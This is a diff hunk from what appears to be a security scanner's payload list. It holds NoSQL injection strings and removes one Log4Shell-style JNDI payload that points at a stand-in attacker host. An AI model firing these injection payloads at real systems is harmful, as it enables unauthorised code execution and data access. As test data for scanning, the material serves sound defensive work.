@@ -50,7 +50,6 @@ PAYLOADS: list[dict] = [
     # NoSQL
     {"type": "nosql", "payload": "{'$ne': null}", "detect": []},
     {"type": "nosql", "payload": "[$ne]=1", "detect": []},
-    {"type": "rce", "payload": "${jndi:ldap://attacker.example/a}", "detect": ['JNDI', 'ldap://', 'Exception', 'Error']},  # auto-added
     # --- AUTO-UPDATED PAYLOADS BELOW (managed by growth pipeline) ---
 ]
 
